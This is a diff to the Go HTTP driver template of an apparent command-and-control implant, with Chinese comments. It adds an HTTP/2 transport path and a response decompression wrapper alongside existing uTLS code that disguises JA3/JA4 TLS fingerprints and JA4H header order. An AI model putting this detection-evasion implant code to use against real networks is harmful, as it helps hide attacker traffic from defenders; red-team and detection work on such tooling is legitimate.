@@ -78,6 +78,11 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 	// {{else}}
 	parseProxyConfig(origin, transport, opts.ProxyConfig)
 	// {{end}}
+	// {{if and .HTTPC2ImplantConfig.TlsEnabled .HTTPC2ImplantConfig.TlsHttp2}}
+	// HTTP/2 客户端:ALPN 强制 h2,失败 fail closed。HTTP/2 没有 1.1 文本头块,
+	// 因此不安装 JA4H 头序重写。
+	client.Transport = newHTTP2Transport(opts, proxyURL)
+	// {{else}}
 	// {{if .HTTPC2ImplantConfig.TlsEnabled}}
 	// uTLS 接管 HTTPS 拨号以定制 ClientHello(JA3/JA4)。
 	// 注意:transport 在 DialTLSContext 生效时会忽略 Proxy 字段,
@@ -89,6 +94,10 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 	// 必须在 uTLS 安装之后,才能包裹其返回的 uTLS 连接(改写发生在加密前)。
 	installRequestFingerprint(transport, opts, proxyURL, secure)
 	// {{end}}
+	// {{end}}
+	// 统一按 Content-Encoding 解压:profile 常显式设置 Accept-Encoding,
+	// 此时 Go 不会自动解压,若上游/CDN 仍压缩会导致载荷解析失败。
+	client.Transport = &decompressTransport{base: client.Transport}
 	return client, nil
 }
 
